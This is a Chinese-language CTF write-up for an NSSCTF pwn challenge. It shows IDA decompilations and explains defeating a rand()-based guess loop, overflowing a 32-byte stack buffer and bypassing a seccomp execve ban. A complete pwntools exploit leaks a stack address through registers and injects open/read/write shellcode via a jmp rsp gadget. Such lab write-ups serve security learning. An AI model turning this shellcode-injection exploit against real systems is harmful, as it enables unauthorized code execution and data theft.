第一次写题解，其中啰嗦和有错误的地方还望海涵，谢谢师傅们 Orz  
这道题核心有一个比较相近的题目，我先把题目放出来：

## [极客大挑战 2019]Not Bad

一会我会叙述两个题之间的区别，还是很大的。  
先拖IDA

```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  unsigned int v3; // eax
  int v5; // [rsp+0h] [rbp-10h] BYREF
  int v6; // [rsp+4h] [rbp-Ch]
  int v7; // [rsp+8h] [rbp-8h]
  int i; // [rsp+Ch] [rbp-4h]

  setbuf(stdin, 0LL);
  setbuf(stdout, 0LL);
  setbuf(stderr, 0LL);
  v7 = 100;
  sandbox();
  v3 = time(0LL);
  srand(v3);
  for ( i = 0; i < v7; ++i )
  {
    v6 = rand() % 50;
    puts("please input a guess num:");
    if ( (unsigned int)__isoc99_scanf("%d", &v5) == -1 )
      exit(0);
    if ( getchar() != 10 )
      exit(1);
    if ( v6 == v5 )
    {
      puts("good guys");
      vulnerable();
    }
    else
    {
      puts("no,no,no");
    }
  }
  return 0;
}
```



首先显而易见的是main函数中有一个随机数取种并且循环一百次，每次判断你的输入和随机数是否相符的函数；  
对此与本次比赛的前一题解法相似，直接在python中调用c语言代码即可，由于线程开始时srand随机数取种都是相同的，所以可以保证判断通过。

```
from ctypes import *
cdll=CDLL('/lib/x86_64-linux-gnu/libc.so.6')#libc可以用过ldd指令查看路径哦
cdll.srand(cdll.time(0))

for i in range(100):
    io.recvuntil('please input a guess num:\n')
    io.sendline(str(cdll.rand()%50))
    s=io.recvline()
```


PS：道理我都懂，可为啥我的上一题通过了，但本题在异地没办法判断成功呢？我有点迷，大概率是随机数取种不同的原因吧qωq  
喵喵喵，反正他有一百次判断，我每一次都随机一个数也是有可能撞上的，我只需要一次进入vulnerble函数就好了。  
ok我们进入vulnerable函数

```
ssize_t vulnerable()
{
  char buf[32]; // [rsp+0h] [rbp-20h] BYREF

  puts("your door");
  return read(0, buf, 0x40uLL);
}
```



很简单的一个栈溢出，可以溢出0x40-0x20=0x20位。我们可以看到函数中没有shell执行区域，也没有system区域，那也就是说我们一般对于ROP题目来说只有shellcode或者libc这种两种解法了。  
但我们可以找找旁边的函数  
![NSSIMAGE](https://www.nssctf.cn/files/2023/4/17/0fce8e8d74.jpg)  
哦，我们找到非原生函数有haha sandbox和vulnerable，看下haha里面：

```
void haha()
{
  __asm { jmp     rsp }
}
```



![NSSIMAGE](https://www.nssctf.cn/files/2023/4/17/a33e753d90.jpg)  
有栈执行权限而且有返回到栈上的语句，我们可以考虑shellcode了。  
桥豆麻袋！这个sandbox函数，可以看出是有沙盒限制的，我们进去具体看看：

```
int sandbox()
{
  __int16 v1; // [rsp+0h] [rbp-40h] BYREF
  __int16 *v2; // [rsp+8h] [rbp-38h]
  __int16 v3; // [rsp+10h] [rbp-30h] BYREF
  char v4; // [rsp+12h] [rbp-2Eh]
  char v5; // [rsp+13h] [rbp-2Dh]
  int v6; // [rsp+14h] [rbp-2Ch]
  __int16 v7; // [rsp+18h] [rbp-28h]
  char v8; // [rsp+1Ah] [rbp-26h]
  char v9; // [rsp+1Bh] [rbp-25h]
  int v10; // [rsp+1Ch] [rbp-24h]
  __int16 v11; // [rsp+20h] [rbp-20h]
  char v12; // [rsp+22h] [rbp-1Eh]
  char v13; // [rsp+23h] [rbp-1Dh]
  int v14; // [rsp+24h] [rbp-1Ch]
  __int16 v15; // [rsp+28h] [rbp-18h]
  char v16; // [rsp+2Ah] [rbp-16h]
  char v17; // [rsp+2Bh] [rbp-15h]
  int v18; // [rsp+2Ch] [rbp-14h]
  __int16 v19; // [rsp+30h] [rbp-10h]
  char v20; // [rsp+32h] [rbp-Eh]
  char v21; // [rsp+33h] [rbp-Dh]
  int v22; // [rsp+34h] [rbp-Ch]
  __int16 v23; // [rsp+38h] [rbp-8h]
  char v24; // [rsp+3Ah] [rbp-6h]
  char v25; // [rsp+3Bh] [rbp-5h]
  int v26; // [rsp+3Ch] [rbp-4h]

  v3 = 32;
  v4 = 0;
  v5 = 0;
  v6 = 4;
  v7 = 21;
  v8 = 0;
  v9 = 2;
  v10 = 0xC000003E;
  v11 = 32;
  v12 = 0;
  v13 = 0;
  v14 = 0;
  v15 = 21;
  v16 = 0;
  v17 = 1;
  v18 = 59;
  v19 = 6;
  v20 = 0;
  v21 = 0;
  v22 = 0;
  v23 = 6;
  v24 = 0;
  v25 = 0;
  v26 = 0x7FFF0000;
  v1 = 6;
  v2 = &v3;
  prctl(38, 1LL, 0LL, 0LL, 0LL);
  return prctl(22, 2LL, &v1);
}
```


最核心的两个函数prtcl38和prtcl22可以看出来是把直接取得shell的方式ban掉了，稳健一下看看seccomp：![NSSIMAGE](https://www.nssctf.cn/files/2023/4/17/6be526267c.jpg)  
可以看出来只有execve被ban了，和我们想的一样，也就是标准orw。  
orw问题推荐一篇博客：  
https://www.jianshu.com/p/754b0a2ae353  
很不错可以看看。  
具体就是用open打开flag，read读取flag，write写出flag。  
最开始尝试着用类似我之前给出的那道题目的方式去做，方法即：

```
stack_start=0x7ffffffde000
payload=asm(shellcraft.read(0,stack_start,0x50))#把ORW组合读到栈上
payload+=asm("jmp rsi")
payload=payload.ljust(0x28,b'\x00')

jmp_rsp=0x40094E
payload+=p64(jmp_rsp)#跳到rsp就相当于到达下一句话
payload+=asm("sub rsp,48;jmp rsp")#返回到payload最初的位置，偏移量需要自己测算
payload=payload.ljust(0x40,b'\x00')
io.send(payload)

payload2=asm(shellcraft.open('./flag'))
payload2+=asm(shellcraft.read(3,0x601068,0x50))
payload2+=asm(shellcraft.write(1,0x601068,0x50))#经典ORW组合

io.send(payload2)
io.interactive()
```



但显然我忘记了一个重要的事情，那就是栈地址随机化。  
栈的地址不一定是0x7ffffffde000，最初我想到的做法是爆破，由于低三位地址和高三位地址都是可知的（最低三位000就好了，最高三位固定7ff），只需要爆破6位，但我想到了一个更好的办法：  
不如我们先把栈地址用汇编语句泄露出来，然后再返回到vulnerable之后再进行这个操作怎样呢？我觉得可行。  
由此我在本地gdb了过后发现有几个能够泄露栈地址的寄存器：![NSSIMAGE](https://www.nssctf.cn/files/2023/4/17/feb69eceb8.jpg)  
也就是说，rbx和r13都是可以的，用shellcraft也很好写：

```
payload=asm(shellcraft.write(1,'rbx',0x10))
payload+=asm("mov rbx,0x40091D;jmp rbx")

payload=payload.ljust(0x28,b'\x00')

jmp_rsp=0x40094E
payload+=p64(jmp_rsp)
payload+=asm("sub rsp,48;jmp rsp")
payload=payload.ljust(0x40,b'\x00')

io.recvuntil('your door\n')
io.send(payload)
stack=u64(io.recv(6).ljust(8,b'\x00'))
print('stack:',hex(stack))
```

 

以上可以泄露出栈地址了，之后在基本影响不到关键控制字段的位置写进去ORW就好了

```
io.recvuntil('your door')

aim=stack-0x200

payload1=asm(shellcraft.read(0,aim,0x50))
payload1+=asm("jmp rsi")
payload1=payload1.ljust(0x28,b'\x00')
print('len:',hex(len(payload1)))
payload1+=p64(jmp_rsp)
payload1+=asm("sub rsp,48;jmp rsp")
payload1=payload1.ljust(0x40,b'\x00')

io.send(payload1)

io.send(payload2)

io.interactive()
```



ok本地flag成功取得。  
但之后可是麻烦大了，最绝望的莫过于无法调试的异地一直EOF。  
通过我上面输出的stack我可以发现，寄存器在异地的存储内容是不同的，所以我推测可以尝试输出所有寄存器试试。  
于是我从rbx rcx r13 r12 rax rbp rsp（rdi和rdx会直接python报错EOF）最后发现r8是可以的。  
直接取得flag了。  
完整exp：

```
from pwn import *
from ctypes import *
context(log_level='debug',arch='amd64',os='linux')

cdll=CDLL('/lib/x86_64-linux-gnu/libc.so.6')
io=process('./RANDOM')
#io=remote('node5.anna.nssctf.cn',28437)

cdll.srand(cdll.time(0))

payload2=asm(shellcraft.open('./flag'))
payload2+=asm(shellcraft.read(3,0x601068,0x50))
payload2+=asm(shellcraft.write(1,0x601068,0x50))

for i in range(100):
    io.recvuntil('please input a guess num:\n')
    io.sendline('1')
    s=io.recvline()
    print('s:',s)
    if len(s)==10:
        break
           #0x7ffefe218000
#这个我是真没办法了，毕竟异地随机数结果不同

gdb.attach(io)
payload=asm(shellcraft.write(1,'r8',0x10))
payload+=asm("mov rbx,0x40091D;jmp rbx")

payload=payload.ljust(0x28,b'\x00')

jmp_rsp=0x40094E
payload+=p64(jmp_rsp)
payload+=asm("sub rsp,48;jmp rsp")
payload=payload.ljust(0x40,b'\x00')

io.recvuntil('your door\n')
io.send(payload)
stack=u64(io.recv(6).ljust(8,b'\x00'))
print('stack:',hex(stack))

io.recvuntil('your door')

aim=stack-0x200

payload1=asm(shellcraft.read(0,aim,0x50))
payload1+=asm("jmp rsi")
payload1=payload1.ljust(0x28,b'\x00')
print('len:',hex(len(payload1)))
payload1+=p64(jmp_rsp)
payload1+=asm("sub rsp,48;jmp rsp")
payload1=payload1.ljust(0x40,b'\x00')

io.send(payload1)

io.send(payload2)

io.interactive()
```



完成！